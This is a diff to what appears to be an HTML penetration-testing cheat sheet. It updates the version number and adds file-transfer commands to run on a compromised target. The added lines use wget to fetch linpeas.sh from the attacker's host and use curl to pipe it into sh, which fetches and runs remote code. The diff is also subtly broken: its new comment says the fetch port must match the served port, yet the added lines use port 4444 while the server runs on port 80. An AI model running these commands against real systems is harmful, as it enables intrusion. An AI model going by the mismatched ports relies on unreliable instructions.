@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.6.1</span>
+  <span class="ver">v1.6.2</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -328,7 +328,9 @@ stty rows 38 cols 190
 <h2 id="file-transfer">File transfer</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># on your box: serve the folder
 python3 -m http.server 80
-# on target (Linux)
+# on target (Linux) - the fetch port must match the port you served on
+wget http://$LHOST:4444/linpeas.sh -O /tmp/linpeas.sh   # then: chmod +x &amp;&amp; run
+curl -s http://$LHOST:4444/linpeas.sh | sh              # nothing writable? pipe it
 wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
 curl http://$LHOST/x -o /tmp/x
 # on target (Windows)
